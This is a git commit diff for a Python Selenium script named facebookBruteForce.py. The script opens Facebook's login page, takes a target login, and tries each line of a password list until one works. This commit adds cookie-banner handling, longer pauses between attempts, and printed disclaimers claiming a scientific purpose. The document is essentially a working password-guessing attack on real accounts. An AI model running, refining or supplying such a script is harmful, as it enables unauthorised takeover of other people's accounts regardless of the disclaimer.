26b9690b488bf99d29a73a10899ab780cee1ac68
PSZMAJ <przemoszmaj@gmail.com>
2021-01-08 23:44:06 +0100

    version 2.0

--- facebookBruteForce.py
+++ facebookBruteForce.py
@@ -6,7 +6,14 @@ import time
 ## Author = [Przemysław Szmaj]
 ## GitHub = https://github.com/PSZMAJ
 ## YouTube = https://www.youtube.com/channel/UCewT7Lr5f6LWvqSPXm0JKRw
-
+print("****************************************************************************************************")
+print("BREAKING IN IS ILLEGAL!/ WŁAMYWANIE SIĘ JEST NIELEGALNE!")
+print("The project was created for a scientific purpose, to check u2f operation)")
+print("Projekt powstał w celu naukowym, mającym sprawdzenie działania uwierzytelniania dwu/wieloetapowego.")
+print("****************************************************************************************************")
+print("")
+print("")
+print("")
 login = input('Please eneter login: ')
 browser = webdriver.Firefox()
 browser.get('https://www.facebook.com/login.php')
@@ -17,6 +24,14 @@ class Attack:
     
     def addlogin(self):
     # locate xpath and send login.
+        time.sleep(2)
+        self.button_cookie = browser.find_element_by_id('u_0_f')
+        time.sleep(0.5)
+        self.button_cookie.click()
+        self.button_cookie_accept = browser.find_element_by_id('u_0_j')
+        time.sleep(0.5)
+        self.button_cookie_accept.click()
+        time.sleep(2)
         self.button_username = browser.find_element_by_xpath('//*[@id="email"]')
         self.button_username.click()
         time.sleep(0.5)
@@ -36,7 +51,7 @@ class Attack:
         for line in lines:
             self.button_password = browser.find_element_by_xpath('//*[@id="pass"]')
             self.button_password.click()
-            time.sleep(0.5)
+            time.sleep(2)
             self.button_password.send_keys(line)
                 
             self.button_login = browser.find_element_by_xpath('//*[@id="loginbutton"]')
